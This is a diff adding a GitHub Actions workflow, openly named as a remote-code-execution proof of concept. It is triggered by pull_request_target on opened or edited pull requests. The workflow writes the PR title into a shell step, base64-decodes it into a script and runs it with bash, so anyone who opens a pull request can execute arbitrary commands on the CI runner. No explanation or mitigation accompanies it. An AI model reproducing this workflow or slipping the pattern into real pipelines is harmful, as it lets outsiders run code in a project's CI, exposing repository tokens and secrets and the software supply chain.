@@ -1,0 +1,23 @@
+name: poc-rce-base64
+
+on:
+  pull_request_target:
+    types: [opened, edited]
+
+permissions:
+  contents: read
+
+jobs:
+  rce-from-pr-title:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Decode PR title and execute
+        run: |
+          echo "[*] Base64 from PR title:"
+          echo "${{ github.event.pull_request.title }}"
+
+          echo "[*] Decoding..."
+          echo "${{ github.event.pull_request.title }}" | base64 -d > decoded.sh
+
+          echo "[*] Executing decoded command..."
+          bash decoded.sh
